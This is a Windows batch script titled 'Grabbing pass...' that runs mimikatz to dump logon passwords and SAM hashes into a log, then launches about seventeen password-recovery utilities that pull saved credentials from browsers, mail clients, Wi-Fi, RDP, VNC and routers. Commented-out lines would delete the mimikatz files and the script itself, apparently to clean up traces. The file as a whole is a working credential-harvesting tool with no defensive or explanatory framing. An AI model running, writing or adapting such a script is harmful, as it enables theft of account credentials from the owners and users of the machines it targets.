mode con: cols=50 lines=30
cls
title Grabbing pass...
@echo off
@echo Grabbing pass...
@echo Do not close this window...

cd /d %~dp0

md !logs
if %PROCESSOR_ARCHITECTURE%==AMD64 (

.\mimikatz\x64\mimikatz.exe "privilege::debug" "log .\!logs\Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit
.\mimikatz\x32\mimikatz.exe "privilege::debug" "log .\!logs\Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit
.\mimikatz\x64\mimikatz.exe "privilege::debug" "log Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit)
.\mimikatz\x32\mimikatz.exe "privilege::debug" "log Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit

.\mimikatz\miparser.vbs .\!logs\Result.txt



if %PROCESSOR_ARCHITECTURE%==AMD64 (
	REM start .\passrecpk\BulletsPassView.exe
	start .\passrecpk\BulletsPassView64.exe
) else (start .\passrecpk\BulletsPassView.exe)
if %PROCESSOR_ARCHITECTURE%==AMD64 (
	REM start .\passrecpk\netpass.exe
	start .\passrecpk\netpass64.exe
) else (start .\passrecpk\netpass.exe)
if %PROCESSOR_ARCHITECTURE%==AMD64 (
	REM start .\passrecpk\PasswordFox.exe
	start .\passrecpk\PasswordFox64.exe
) else (start .\passrecpk\PasswordFox.exe)
if %PROCESSOR_ARCHITECTURE%==AMD64 (
	REM start .\passrecpk\SniffPass.exe
	start .\passrecpk\SniffPass64.exe
) else (start .\passrecpk\SniffPass.exe)
if %PROCESSOR_ARCHITECTURE%==AMD64 (
	REM start .\passrecpk\WirelessKeyView.exe
	start .\passrecpk\WirelessKeyView64.exe
) else (start .\passrecpk\WirelessKeyView.exe)


start .\passrecpk\ChromePass.exe
start .\passrecpk\Dialupass.exe
start .\passrecpk\iepv.exe
start .\passrecpk\mailpv.exe
start .\passrecpk\mspass.exe
start .\passrecpk\OperaPassView.exe
start .\passrecpk\pspv.exe
start .\passrecpk\PstPassword.exe
start .\passrecpk\rdpv.exe
start .\passrecpk\RouterPassView.exe
start .\passrecpk\VNCPassView.exe
start .\passrecpk\WebBrowserPassView.exe





REM del mimikatz.exe /F /Q
REM del mimidrv.sys /F /Q
REM del mimilib.dll /F /Q
REM del %0









REM @echo.
REM pause > nul
